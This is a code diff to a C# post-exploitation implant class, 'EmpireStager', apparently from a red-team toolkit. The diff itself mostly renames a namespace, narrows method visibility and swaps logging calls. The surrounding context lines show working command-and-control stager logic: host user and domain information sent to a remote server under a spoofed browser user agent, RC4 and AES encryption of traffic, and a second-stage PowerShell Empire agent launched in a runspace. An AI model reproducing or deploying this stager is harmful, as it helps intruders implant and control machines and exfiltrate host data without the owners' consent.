@@ -13,7 +13,9 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 
-namespace WheresMyImplant
+using WheresMyImplant;
+
+namespace Empire
 {
     class EmpireStager : Base
     {
@@ -27,7 +29,7 @@ namespace WheresMyImplant
         private string key;
 
         ////////////////////////////////////////////////////////////////////////////////
-        public EmpireStager(string server, string stagingKey, string language)
+        internal EmpireStager(string server, string stagingKey, string language)
         {
             this.server = server;
             this.stagingKey = stagingKey;
@@ -50,17 +52,17 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public void execute()
+        internal void execute()
         {
             try
             {
                 byte[] stage1response = stage1();
-                WriteOutputGood("Stage1 Complete");
+                Console.WriteLine("[+] Stage1 Complete");
 
                 byte[] stage2response = stage2(stage1response);
-                WriteOutputGood("Stage2 Complete");
+                Console.WriteLine("[+] Stage2 Complete");
 
-                WriteOutputGood("Launching Empire");
+                Console.WriteLine("[+] Launching Empire");
                 if (language == "powershell" || language == "ps" || language == "posh")
                 {
                     powershellEmpire(stage2response);
@@ -83,10 +85,10 @@ namespace WheresMyImplant
                     execute();
                 }
             }
-            catch (Exception error)
+            catch (Exception ex)
             {
-                WriteOutputBad("Execution Failed");
-                WriteOutputBad(error.ToString());
+                Console.WriteLine("[-] Execution Failed");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
             finally
             {
@@ -165,7 +167,7 @@ namespace WheresMyImplant
             execution += " -StagingKey \"" + stagingKey + "\"";
             execution += " -SessionKey \"" + key + "\"";
             execution += " -SessionID  \"" + id + "\"";
-            WriteOutputNeutral(execution);
+            Console.WriteLine("[+] {0}", execution);
 
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
@@ -203,7 +205,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static byte[] sendData(string server, byte[] data)
+        internal static byte[] sendData(string server, byte[] data)
         {
             string userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
             byte[] response = new byte[0];
@@ -218,7 +220,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static byte[] GetSystemInformation(string information, string server)
+        internal static byte[] GetSystemInformation(string information, string server)
         {
             information += server + "|";
             information += Environment.UserDomainName + "|";
@@ -286,7 +288,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
+        internal static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
         {
             byte[] output = new byte[data.Length];
             byte[] s = new byte[256];
@@ -333,7 +335,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static byte[] aesEncrypt(byte[] keyBytes, byte[] ivBytes, byte[] dataBytes)
+        internal static byte[] aesEncrypt(byte[] keyBytes, byte[] ivBytes, byte[] dataBytes)
         {
             byte[] encryptedBytes = new byte[0];
             using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
@@ -348,7 +350,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static byte[] aesDecrypt(string key, byte[] data)
+        internal static byte[] aesDecrypt(string key, byte[] data)
         {
             HMACSHA256 hmac = new HMACSHA256();
             hmac.Key = Encoding.ASCII.GetBytes(key);
@@ -374,7 +376,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static byte[] combine(byte[] byte1, byte[] byte2)
+        internal static byte[] combine(byte[] byte1, byte[] byte2)
         {
             Int32 dwSize = byte1.Length + byte2.Length;
             MemoryStream memoryStream = new MemoryStream(new byte[dwSize], 0, dwSize, true, true);
